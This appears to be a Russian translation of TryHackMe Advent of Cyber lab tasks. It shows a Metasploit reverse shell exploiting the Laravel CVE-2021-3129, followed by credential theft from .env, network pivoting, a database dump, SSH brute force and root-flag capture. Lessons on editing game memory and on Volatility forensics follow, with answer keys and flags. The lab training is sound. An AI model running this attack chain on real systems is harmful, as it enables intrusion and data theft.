использовать eth0, а не VPN IP , отображаемый в Kali Machine в правом верхнем углу (это tun0). 

Чтобы узнать, какой IP-адрес вам нужно использовать, вы можете открыть новый терминал и ввести ip addr. Нужный вам 
IP-адрес будет начинаться с 10.xxx . Помните, вам нужно будет использовать eth0 или tun0, в зависимости от того, 
используете ли вы TryHackMe Kali Web-Machine.  

Использование ip addr для вывода списка интерфейсов, соответствующих IP-адресу в Kali
```commandline
kali@kali:~$ ip addr
2: eth0:  mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:cd:41:12:70:5d brd ff:ff:ff:ff:ff:ff
    inet 10.9.11.45/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2973sec preferred_lft 2973sec
    inet6 fe80::cd:41ff:fe12:705d/64 scope link
       valid_lft forever preferred_lft forever
```

Теперь, когда мы подтвердили наличие уязвимости, давайте запустим модуль, чтобы открыть новый сеанс:

Метасплоит Консольные команды
```commandline
msf6 exploit(multi/php/ignition_laravel_debug_rce) > run rhost=MACHINE_IP lhost=ATTACKER_IP HttpClientTimeout=20

[*] Started reverse TCP handler on 10.9.0.185:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.143.36:80
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.9.0.185:4444 -> 10.10.143.36:53986) at 2022-09-13 11:55:50 -0400
whoami

www-data
```

Открытая оболочка будет базовой cmd/unix/reverse_bashоболочкой. Мы можем увидеть это, запустив фоновую команду и 
просмотрев текущие активные сеансы: 

Метасплоит Консольные команды
```commandline
background

Background session 1? [y/N]  y
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.9.0.185:4444 -> 10.10.143.36:53986 (10.10.143.36)
```

Если вы в данный момент находитесь в сеансе, вы можете запустить команду , чтобы вернуться к командной строке 
Metasploitbackground верхнего уровня . Чтобы обновить последний открытый сеанс до Meterpreter , используйте команду. 
Metasploit теперь будет показывать два открытых сеанса — один для исходного сеанса оболочки и другой для нового 
сеанса Meterpreter :sessions -u -1   

Метасплоит Консольные команды
```commandline
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.0.185:4433
[*] Sending stage (989032 bytes) to 10.10.143.36
[*] Meterpreter session 2 opened (10.9.0.185:4433 -> 10.10.143.36:51132) at 2022-09-13 12:02:51 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.9.0.185:4444 -> 10.10.143.36:53986 (10.10.143.36)
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.9.0.185:4433 -> 10.10.143.36:51132 (172.28.101.50)
```

После взаимодействия с сеансом Meterpretersessions -i -1 и изучения приложения мы видим, что доступны учетные данные базы данных:

Meterpreter Команды
```commandline
meterpreter > cat /var/www/.env
# ...

DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=....
DB_USERNAME=...
DB_PASSWORD=...
```

Мы можем использовать Meterpreter для преобразования этого удаленного имени хоста в IP-адрес, который мы можем использовать для атак:

Meterpreter Команды
```commandline
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51
```

Поскольку это внутренний IP-адрес, на него невозможно напрямую направлять трафик. Вместо этого мы можем использовать 
поддержку поворота сети в msfconsole, чтобы достичь недоступного хоста. Чтобы настроить глобальную таблицу 
маршрутизации в msfconsole, убедитесь, что вы запустили команду backgroundиз сеанса Meterpreter :  

Метасплоит Консольные команды
```commandline
# The discovered webserice_database IP will be routed to through the Meterpreter session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
[*] Route added
```

Мы также можем видеть, благодаря присутствию файла /.dockerenv, что мы находимся в контейнере Docker. По умолчанию 
Docker выбирает жестко закодированный IP для представления хост-машины. Мы также добавим его в нашу таблицу 
маршрутизации для последующего сканирования:  

Метасплоит Консольные команды
```commandline
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
[*] Route added
```

Мы можем распечатать таблицу маршрутизации для проверки параметров конфигурации:

Метасплоит Консольные команды
```commandline
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.255    Session 3
   172.28.101.51      255.255.255.255    Session 3


[*] There are currently no IPv6 routes defined.
```

С ранее обнаруженными учетными данными базы данных и настроенной таблицей маршрутизации мы можем начать запускать 
модули Metasploit, нацеленные на Postgres. Начиная с дампа схемы, а затем запуская запросы для выбора информации из 
базы данных:  

Метасплоит Консольные команды
```commandline
# Dump the schema
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres

# Select information from a specific table
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
```

Для дальнейшего развертывания частной сети мы можем создать прокси-сервер Socks в Metasploit:

Метасплоит Консольные команды
```commandline
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```

Это откроет порт на машине злоумышленника, через который можно будет запустить другие сетевые инструменты, такие как 
curl или proxychains

Команды оболочки
```commandline
# From the attacker’s host machine, we can use curl with the internal Docker IP to show that the web application is running, and the socks proxy works
$ curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v

… etc …

# From the attacker’s host machine, we can use ProxyChains to scan the compromised host machine for common ports
$ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 08:48 EDT
Nmap scan report for 172.17.0.1
Host is up (0.069s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

При сканировании хоста мы видим, что на хост-машине открыт порт 22. Также возможно, что Санта повторно использовал 
свой пароль, и можно подключиться по SSH к хост-машине из контейнера Docker, чтобы захватить флаг: 

Метасплоит Консольные команды
```commandline
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > run ssh://santa_username_here:santa_password_here@172.17.0.1

[*] 172.17.0.1:22 - Starting bruteforce
[+] 172.17.0.1:22 - Success: 'santa_username_here:santa_password_here' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 4 opened (10.11.8.17-10.10.152.194:55634 -> 172.17.0.1:22) at 2022-11-22 02:49:43 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.11.8.17:4444 -> 10.10.152.194:44140 (10.10.152.194)
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.11.8.17:4433 -> 10.10.152.194:33312 (172.28.101.50)
  3         shell linux            SSH kali @                10.11.8.17-10.10.152.194:55632 -> 172.17.0.1:22 (172.17.0.1)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i -1
[*] Starting interaction with 3...

mesg: ttyname failed: Inappropriate ioctl for device
ls /root
root.txt
cat /root/root.txt
THM{...}
```

### Ответить на вопросы ниже
Разверните присоединенную виртуальную машину и подождите несколько минут. Какие порты открыты?
```commandline
80
```
На каком фреймворке разработано веб-приложение?
```commandline
laravel
```
К каким CVE-уязвимостям относится приложение?
```commandline
CVE-2021-3129
```
Какую команду можно использовать для обновления последнего открытого сеанса до сеанса Meterpreter?
```commandline
sessions -u -1
```
Какой файл указывает на то, что сеанс был открыт в контейнере Docker?
```commandline
/.dockerenv
```
Какой файл часто содержит полезные учетные данные для веб-приложений?
```commandline
.env
```
Какая таблица базы данных содержит полезные учетные данные?
```commandline
users
```
Какой пароль у Санты?
```commandline
p4$$w0rd
```
Какие порты открыты на хост-машине?
```commandline
22,80
```
Что такое корневой флаг?
```commandline
THM{47C61A0FA8738BA77308A8A600F88E4B}
```
День 9 завершен! Возможно, вам стоит сейчас отдохнуть. Если эта задача вам по душе, то, как нам кажется, вам понравится  модуль Compromising Active Directory  ! 
```commandline
Ответ не нужен
```

## Задание 15
Посмотрите видео-прохождение Alh4zr3d для 10-го дня здесь !


Команда Санты пока что преуспела. Синие и красные эльфы вместе обеспечили безопасность всего технологического вокруг.
Бандит Йети, неспособный ничего взломать, решил прибегнуть к сверхъестественной магии в качестве последнего средства 
и заманил Эльфийку МакСкиди в видеоигру, пока она спала. Когда остальные эльфы проснулись, их лидера нигде не было 
видно, пока Эльфийский разведчик МакРед не заметил один из их экранов, на котором можно было увидеть 
пикселизированную фигуру Эльфийки МакСкиди. Возле экрана была ледяная записка: «Только победив в игре, в которой 
невозможно победить, ты вернешь себе свою дорогую Эльфийку МакСкиди» .     

Без своего вождя эльфы в отчаянии побежали. Как они могли управлять SOC без его главы? Игра была подстроена, и 
попытка за попыткой эльфы проигрывали, несмотря ни на что. Как будто пораженный молнией, Elf Exploit McRed встал со 
своего стула и сказал остальным:  «Если мы не можем выиграть, мы взломаем это!» .  

Эльфы в отчаянии

### Цели обучения
- Узнайте, как данные хранятся в памяти в играх и других приложениях.
- Используйте простые инструменты для поиска и изменения данных в памяти.
- Изучите влияние изменения данных в памяти на запущенную игру.

### Память программы

Всякий раз, когда мы выполняем программу, все данные будут каким-то образом обработаны через оперативную память 
компьютера (RAM). Если вы подумаете о видеоигре, ваше здоровье, позиция, скорость движения и направление хранятся 
где-то в памяти и обновляются по мере необходимости по ходу игры.   

#### Макет игровой памяти

Если вы можете изменить соответствующие позиции памяти, вы можете обмануть игру, заставив ее думать, что у вас 
больше HP, чем должно быть, или даже более высокий счет! Это звучит относительно просто, но пространство памяти 
программы огромно и разрежено, и поиск места, где хранятся эти переменные, — это не то, что вы хотели бы делать 
вручную. Надеюсь, некоторые инструменты помогут нам перемещаться по памяти и находить, где находится вся сочная 
информация.    

Обязательно нажмите кнопку Start Machine, прежде чем продолжить. Машина запустится в режиме разделенного экрана. 
Если виртуальная машина не видна, используйте синюю кнопку Show Split View в правом верхнем углу страницы. Все, что 
вам нужно для этого испытания, доступно в развертываемой машине. Однако, если вы предпочитаете сделать это, вы 
можете загрузить и установить Cetus на свою собственную машину, загрузив его отсюда .   


Cetus — это простой плагин для браузера, работающий в Firefox и Chrome, позволяющий вам исследовать пространство 
памяти игр Web Assembly, которые работают в вашем браузере. Основная идея заключается в том, чтобы предоставить вам 
инструменты для легкого поиска любого фрагмента данных, хранящегося в памяти, и изменения его при необходимости. 
Кроме того, он позволит вам изменять скомпилированный код игры и изменять ее поведение, если вы этого захотите, хотя 
нам не нужно будет углубляться в эту задачу так глубоко.

Cetus уже установлен на Chrome на вашей развернутой машине, поэтому вы можете использовать его сразу же для 
выполнения оставшейся задачи. Если вы обнаружите, что игра работает медленно при использовании машины в браузере, вы 
всегда можете установить Cetus на свою машину и выполнить задачу оттуда, следуя указаниям, приведенным ниже.

- Установка Cetus на Firefox (нажмите, чтобы прочитать)
- Установка Cetus на Chrome (нажмите, чтобы прочитать)
### Доступ к Cetus
Чтобы открыть игру, перейдите на развернутую машину и щелкните значок «Сохранить Elf McSkidy» на рабочем столе. Это 
откроет Google Chrome с уже загруженным Cetus. 

Значок игры в машине

Чтобы найти Cetus, вам нужно открыть его, Developer tools нажав кнопку в правом верхнем углу Chrome, как показано на 
рисунке ниже: 

Инструменты разработчика

Cetus находится на одной из вкладок:

В поисках Кита

При открытом Cetus нажмите кнопку обновления, чтобы перезагрузить игру. Если вы установили Cetus на свой компьютер, 
вы можете найти игру по адресу  https://MACHINE_IP/ . Cetus должен обнаружить запущенную игру веб-сборки и показать 
вам доступные инструменты:  

Интерфейс Cetus

Примечание: если Cetus отображает сообщение «Ожидание WASM», просто перезагрузите игру, и инструменты должны загрузиться.

Угадай номер охранника

Если вы пройдетесь по игре, то обнаружите, что охранник не позволит вам уйти, пока вы не угадаете случайно 
сгенерированное число. В какой-то момент игра должна сохранить это число в памяти. Cetus позволит нам быстро 
определить адрес памяти случайного числа.  

В качестве первого шага поговорите с охранником и попробуйте угадать число наугад. Вы, вероятно, не угадаете его с 
первой попытки, но запомните номер охранника. 

Случайное число охранника

Вы можете использовать Cetus, чтобы найти все адреса памяти, используемые игрой, которые соответствуют заданному 
значению. В этом случае номер охранника, вероятно, является обычным целым числом, поэтому мы выбираем i32(32-битное 
целое число) в Типе значения.  

Cetus также позволяет вам искать числа с десятичными дробями (обычно называемые числами с плавающей точкой), 
представленные типами f32и f64, а также строки, закодированные в ascii, utf-8или bytes. Вам необходимо указать тип 
данных как часть вашего поиска, поскольку для вашего компьютера значения 32(целое число) и 32.0(число с плавающей 
точкой) хранятся в памяти в разных форматах.   

Мы будем использовать EQ оператор сравнения, который будет искать адреса памяти, содержимое которых равно введенному 
нами значению. Обратите внимание, что вы также можете искать значения, используя любой из других доступных 
операторов. Для справки, вот что делают другие операторы: 


Поиск номера охранника

### Ответить на вопросы ниже
Какой флаг у гвардии?
```commandline
THM{5_star_Fl4gzzz}
```
Какой флаг у Йети?
```commandline
THM{yetiyetiyetiflagflagflag}
```
Если вам понравилось сегодняшнее задание, то «Прогулка по комнате для приложений» станет отличным продолжением! 
```commandline
Ответ не нужен
```
## Задание 16
Посмотрите видеообзор SecurityNinja для 11-го дня  здесь !

Эльфы в Центре безопасности операций Санты (SSOC) усердно работают, проверяя свои панели мониторинга, когда Эльф 
МакДэйв, один из сотрудников мастерской,  стучит в дверь. Эльф говорит:  «Я только что нажал на что-то, и теперь моя 
рабочая станция ведет себя очень странно. Можешь взглянуть?».  

Elf McSkidy поручает вам, Elf McBlue, исследовать рабочую станцию. Спустившись в цех, вы видите командную строку, 
запускающую какой-то код. Ой-ой! Это нехорошо. Вы немедленно создаете дамп памяти рабочей станции и помещаете этот 
дамп на выданный вашим сотрудником USB-накопитель, возвращаясь в SSOC для дальнейшего анализа.  

Вы подключаете USB-накопитель к своей рабочей станции и начинаете расследование.

### Что такое криминалистика памяти?фотография эльфа макблю

Криминалистика памяти — это анализ энергозависимой памяти, которая используется при включении компьютера. Компьютеры 
используют специальные устройства хранения, называемые оперативной памятью (ОЗУ), чтобы помнить, что выполняется на 
компьютере в данный момент. ОЗУ работает очень быстро и является предпочтительным методом хранения и доступа к 
данным. Однако оно ограничено по сравнению с устройствами хранения, такими как жесткие диски. Этот тип данных 
является энергозависимым, поскольку он будет удален при выключении компьютера.  ОЗУ хранит такие данные, как буфер 
обмена или несохраненные файлы.      

Мы можем проанализировать память компьютера, чтобы увидеть, какие приложения (процессы), какие сетевые соединения 
были сделаны, и много другой полезной информации. Например, мы можем проанализировать память компьютера, зараженного 
вредоносным ПО, чтобы увидеть, что вредоносное ПО делало в тот момент.   

Давайте подумаем о готовке. Обычно вы храните всю свою еду в холодильнике — этот холодильник — жесткий диск. Когда 
вы готовите, вы будете хранить ингредиенты на кухонном столе, чтобы иметь к ним быстрый доступ, но кухонный стол ( 
RAM ) намного меньше холодильника (жесткий диск)  

Почему криминалистика памяти полезна?Изображение микросхемы памяти компьютера

Криминалистика памяти — чрезвычайно важный элемент при исследовании компьютера. Дамп памяти — это полный захват того,
что происходило на компьютере в тот момент, например, сетевые соединения или работающие в фоновом режиме вещи. Чаще 
всего вредоносный код пытается спрятаться от пользователя. Однако он не может спрятаться от памяти.  

Мы можем использовать этот захват памяти для анализа в дальнейшем, особенно потому, что память на компьютере в 
конечном итоге будет утеряна (например, если мы выключим компьютер, чтобы предотвратить распространение вредоносного 
ПО). Анализируя память, мы можем точно узнать, что делало вредоносное ПО, с кем оно связывалось и т. д.   

### Введение в процессы

В простейшем случае процесс — это запущенная программа. Например, процесс создается при запуске экземпляра блокнота. 
У вас может быть несколько процессов для приложения (например, запуск трех экземпляров блокнота создаст три процесса)
. Это важно знать, поскольку возможность определить, какие процессы были запущены на компьютере, скажет нам, какие 
приложения были запущены во время захвата.   

В Windows мы можем использовать диспетчер задач (на рисунке ниже) для просмотра и управления процессами, запущенными 
на компьютере. 

Изображение диспетчера задач Windows

Диспетчер задач Windows

На компьютере процессы обычно делятся на две группы:


- Пользовательский процесс	Эти процессы — программы, которые запустил пользователь. Например, текстовые редакторы, 
веб-браузеры и т. д.	notepad.exe — это текстовый редактор, запускаемый пользователем.
- Фоновый процесс	Эти процессы автоматически запускаются и управляются операционной системой и часто необходимы 
  для корректной работы операционной системы.	dwm.exe — это важный процесс Windows, отвечающий за отображение окон и приложений на компьютере.
### Знакомство с волатильностью

Volatility — это набор инструментов для криминалистики памяти с открытым исходным кодом, написанный на Python. 
Volatility позволяет нам анализировать дампы памяти, полученные с устройств Windows, Linux и Mac OS, и является 
чрезвычайно популярным инструментом в криминалистике памяти. Например, Volatility позволяет нам:  

Перечислите все процессы, которые были запущены на устройстве во время захвата.
Список активных и закрытых сетевых подключений
Используйте правила Yara для поиска индикаторов вредоносного ПО
Извлечение хешированных паролей, содержимого буфера обмена и содержимого командной строки.
И многое, многое другое!
После установки Volatility и ее требований (например, Python) Volatility можно запустить с помощью python3 vol.py. Терминал ниже отображает меню справки Volatility:

Отображение меню помощи Volatility
```commandline
cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -h
Volatility 3 Framework 2.4.1
usage: volatility [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]] [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG] [-o OUTPUT_DIR] [-q]
                  [-r RENDERER] [-f FILE] [--write-config] [--save-config SAVE_CONFIG] [--clear-cache] [--cache-path CACHE_PATH] [--offline]
                  [--single-location SINGLE_LOCATION] [--stackers [STACKERS [STACKERS ...]]]
                  [--single-swap-locations [SINGLE_SWAP_LOCATIONS [SINGLE_SWAP_LOCATIONS ...]]]
                  plugin ...

An open-source memory forensics framework

optional arguments:
  -h, --help            Show this help message and exit, for specific plugin options use 'volatility  --help'
  -c CONFIG, --config CONFIG
  --cropped for brevity--
```

Сегодняшнее задание будет охватывать Volatility 3, который был первоначально выпущен в 2020 году для замены 
устаревшего фреймворка Volatility 2. Для запуска Volatility требуется несколько аргументов: 

Вызов инструмента Volatility через python3 vol.py
Любые параметры, такие как имя и местоположение дампа памяти
Действие, которое вы хотите выполнить (т. е. какие плагины вы хотите использовать — мы скоро к этому вернемся!)
Некоторые общие параметры и примеры, которые вы, возможно, захотите предоставить Volatility, приведены в таблице ниже:


И наконец, теперь нам нужно решить, для чего мы хотим проанализировать изображение. Volatility использует плагины 
для выполнения анализа, такие как: 

- Процессы листинга
- Список сетевых подключений
- Вывод содержимого буфера обмена, блокнота или командной строки
- И многое другое! Если вам интересно, вы можете прочитать документацию здесь


В этой задаче мы будем использовать волатильность для:
- Посмотрите, из какой операционной системы взят дамп памяти.
- Посмотрите, какие процессы были запущены во время захвата.
- Посмотрите, какие связи были установлены во время захвата.
- Использование волатильности для анализа изображения

Прежде чем продолжить наш анализ, нам нужно подтвердить операционную систему устройства, с которого была захвачена 
память. Нам нужно подтвердить это, поскольку это определит, какие плагины мы можем использовать в нашем расследовании.  

Сначала давайте используем imageinfo плагин для анализа нашего файла дампа памяти, чтобы определить операционную 
систему. Для этого нам нужно использовать следующую команду (не забывая включить наш дамп памяти с помощью опции -f) : python3 vol.py -f workstation.vmem windows.info.  

Примечание: Иногда это может занять несколько минут в зависимости от размера дампа памяти и аппаратного обеспечения системы, выполняющей сканирование.

Использование Volatility для сбора информации о дампе памяти
```commandline
cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.info
Volatility 3 Framework 2.4.1
Progress:  100.00   PDB scanning finished
Variable  Value

Kernel Base 0xf803218a8000
DTB 0x1ad000
Symbols file:///home/ubuntu/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/E0093F3AEF15D58168B753C9488A4043-1.json.xz
Is64Bit True
IsPAE False
layer_name  0 WindowsIntel32e
memory_layer  1 FileLayer
KdVersionBlock  0xf80321cd23c8
Major/Minor 15.18362
MachineType 34404
KeNumberProcessors  4
SystemTime  2022-11-23 10:15:56
NtSystemRoot  C:\Windows
NtProductType NtProductWinNt
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine  34404
PE TimeDateStamp  Mon Apr 14 21:36:50 2104
ubuntu@aoc2022-day-11:~/volatility3$
```

Отлично! Мы видим, что Volatility подтвердила, что операционная система — Windows. С этой информацией мы теперь 
знаем, что нам нужно использовать подмножество плагинов Windows с Volatility. Плагины, которые будут использоваться 
в сегодняшней задаче, подробно описаны в таблице ниже:  

### Показ используемых плагинов
```commandline
windows.pslist

python3 vol.py -f workstation.vmem windows.pslist
```


Использование windows.pslist
```commandline
ubuntu@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.pslist
Volatility 3 Framework 2.4.1
Progress:  100.00   PDB scanning finished
PID PPID  ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime  ExitTime  File output

4 0 System  0xc0090b286040  141 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled
104 4 Registry  0xc0090b2dd080  4 - N/A False 2022-11-23 09:43:04.000000  N/A Disabled
316 4 smss.exe  0xc0090e438400  2 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled
436 428 csrss.exe 0xc0090ea65140  10  - 0 False 2022-11-23 09:43:18.000000  N/A Disabled
512 504 csrss.exe 0xc0090f35e140  12  - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
536 428 wininit.exe 0xc0090f2c0080  1 - 0 False 2022-11-23 09:43:19.000000  N/A Disabled
584 504 winlogon.exe  0xc0090f383080  3 - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
656 536 services.exe  0xc0090e532340  5 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
680 536 lsass.exe 0xc0090f3a5080  6 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
792 656 svchost.exe 0xc0090fa33240  12  - 0 False 2022-11-23 09:43:22.000000  N/A Disabled
820 536 fontdrvhost.ex  0xc0090f3a3140  5 - 0 False 2022-11-23 09:43:22.000000  N/A Disabled
828 584 fontdrvhost.ex  0xc0090fa39140  5 - 1 False 2022-11-23 09:43:22.000000  N/A Disabled
916 656 svchost.exe 0xc0090fad72c0  7 - 0 False 2022-11-23 09:43:23.000000  N/A Disabled
1000  584 dwm.exe 0xc0090fb0b080  13  - 1 False 2022-11-23 09:43:24.000000  N/A Disabled
380 656 svchost.exe 0xc0090fba9240  41  - 0 False 2022-11-23 09:43:25.000000  N/A Disabled
420 656 svchost.exe 0xc0090fbbf280  15  - 0 False 2022-11-23 09:43:25.000000  N/A Disabled
1116  656 svchost.exe 0xc0090fc2e2c0  16  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
1124  656 svchost.exe 0xc0090fc302c0  16  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
1204  656 svchost.exe 0xc0090fc2a080  19  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
1256  4 MemCompression  0xc0090fa35040  34  - N/A False 2022-11-23 09:43:26.000000  N/A Disabled
1292  656 svchost.exe 0xc0090fc752c0  2 - 0 False 2022-11-23 09:43:26.000000  N/A Disabled
1436  656 svchost.exe 0xc0090fdb52c0  7 - 0 False 2022-11-23 09:43:28.000000  N/A Disabled
--cropped for brevity--


windows.psscan

python3 vol.py -f workstation.vmem windows.psscan
```


Использование windows.pscan
```commandline
cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.psscan
Volatility 3 Framework 2.4.1
Progress:  100.00   PDB scanning finished
PID PPID  ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime  ExitTime  File output

4 0 System  0xc0090b286040  141 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled
104 4 Registry  0xc0090b2dd080  4 - N/A False 2022-11-23 09:43:04.000000  N/A Disabled
2528  2108  vm3dservice.ex  0xc0090b303080  2 - 1 False 2022-11-23 09:43:38.000000  N/A Disabled
2440  656 svchost.exe 0xc0090b336080  11  - 0 False 2022-11-23 09:43:37.000000  N/A Disabled
6584  792 ApplicationFra  0xc0090b375080  2 - 1 False 2022-11-23 09:58:58.000000  N/A Disabled
1048  656 SecurityHealth  0xc0090b39e080  9 - 0 False 2022-11-23 09:44:46.000000  N/A Disabled
1928  4064  cmd.exe 0xc0090b3a84c0  1 - 1 False 2022-11-23 09:59:09.000000  N/A Disabled
2040  5888  mysterygift.ex  0xc0090b52e4c0  3 - 1 False 2022-11-23 10:15:19.000000  N/A Disabled
316 4 smss.exe  0xc0090e438400  2 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled
656 536 services.exe  0xc0090e532340  5 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
436 428 csrss.exe 0xc0090ea65140  10  - 0 False 2022-11-23 09:43:18.000000  N/A Disabled
536 428 wininit.exe 0xc0090f2c0080  1 - 0 False 2022-11-23 09:43:19.000000  N/A Disabled
512 504 csrss.exe 0xc0090f35e140  12  - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
584 504 winlogon.exe  0xc0090f383080  3 - 1 False 2022-11-23 09:43:19.000000  N/A Disabled
820 536 fontdrvhost.ex  0xc0090f3a3140  5 - 0 False 2022-11-23 09:43:22.000000  N/A Disabled
680 536 lsass.exe 0xc0090f3a5080  6 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled
792 656 svchost.exe 0xc0090fa33240  12  - 0 False 2022-11-23 09:43:22.000000  N/A Disabled
1256  4 MemCompression  0xc0090fa35040  34  - N/A False 2022-11-23 09:43:26.000000  N/A Disabled
828 584 fontdrvhost.ex  0xc0090fa39140  5 - 1 False 2022-11-23 09:43:22.000000  N/A Disabled
916 656 svchost.exe 0xc0090fad72c0  7 - 0 False 2022-11-23 09:43:23.000000  N/A Disabled
--cropped for brevity--


windows.dumpfiles

python3 vol.py -f workstation.vmem windows.dumpfiles
```


Использование файлов windows.dumpfiles
```commandline
cmnatic@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.dumpfiles --pid 4640
Volatility 3 Framework 2.4.1
Progress:  100.00   PDB scanning finished
Cache FileObject  FileName  Result

ImageSectionObject  0xc00910256a80  WinStore.App.exe  dumping file
DataSectionObject 0xc0090fc4bae0  ~FontCache-FontFace.dat dumping file
ImageSectionObject  0xc00911d3f740  Windows.UI.Xaml.winmd dumping file
DataSectionObject 0xc00910d27210  ~FontCache-S-1-5-21-4089795901-3714076801-2393801563-1000.dat dumping file
ImageSectionObject  0xc0091491f6a0  Windows.UI.Xaml.Resources.rs5.dll dumping file
ImageSectionObject  0xc0091123add0  Windows.ApplicationModel.winmd  dumping file
--cropped for brevity--
```

Изображение логотипа группы Bandit Yeti APT

Чтобы получить доступ к дампу памяти,  вам нужно будет развернуть машину, прикрепленную к этой задаче, нажав зеленую 
кнопку «Запустить машину», расположенную в правом верхнем углу этой задачи. Машина должна запуститься в режиме 
разделенного экрана. Если этого не произошло, вам нужно будет нажать синюю кнопку «Показать разделенный экран» около 
правого верхнего угла этой страницы.     

Volatility и файл памяти (с именем workstation.vmem) находятся в /home/elfmcblue/volatility3.

### Ответить на вопросы ниже
Каков номер версии Windows, которую захватил образ памяти?

Примечание: это первоначальное сканирование может занять около 10 минут. Почему бы не выпить воды или не размять ноги?
```commandline
10
```
Как называется двоичный файл/подарок, который оставил тайный Санта?
```commandline
mysterygift.exe
```
Каков идентификатор процесса (PID) этого двоичного файла?
```commandline
2040
```
Сбросить содержимое этого двоичного файла. Сколько файлов сбрасывается?
```commandline
16
```
Если вы хотите узнать больше о Volatility, посетите специальную комнату  здесь . Для получения дополнительной 
информации о криминалистике у нас есть полный  модуль Digital Forensics and Incident Response  для вас!  
```commandline
Ответ не нужен
```

## Задание 17
Посмотрите видео-обзор HuskyHack для 12-го дня  здесь !

Подтверждено, что вредоносный документ, прикрепленный к фишинговому письму, был выполнен. Помимо того факта, что 
были замечены мошеннические соединения, мы мало что знаем о том, что он делает. 

Наш внутренний эксперт Forensic McBlue подтвердил, что вредоносный документ породил другой подозрительный двоичный 
файл. Отталкиваясь от этого, он выгрузил его из памяти для этой задачи, чтобы проанализировать ее дальше с помощью 
Malware Analysis.

### ОБНАРУЖЕНА БОМБА!

### Цели обучения
- Изучите основы анализа образцов вредоносного ПО, не прибегая к использованию автоматизированных сканеров-песочниц.
- Изучите и поймите типичное поведение вредоносного ПО и его важность в процессе расследования инцидентов.
- Основные виды поведения вредоносных программ

Прежде чем приступить к работе с образцом вредоносного ПО для этой задачи, нам необходимо кратко рассказать о 
типичном поведении вредоносного ПО, чтобы иметь четкое представление о том, чего ожидать при работе с образцами 
вредоносного ПО.   

Знаменитое слово в кибербезопасности, вредоносное ПО — это программное обеспечение, созданное для нанесения вреда 
компьютеру или целой сети. Субъекты угроз разрабатывают вредоносное ПО для достижения определенных целей, таких как 
проникновение в сети, взлом конфиденциальных данных или нарушение работы операционных служб.  

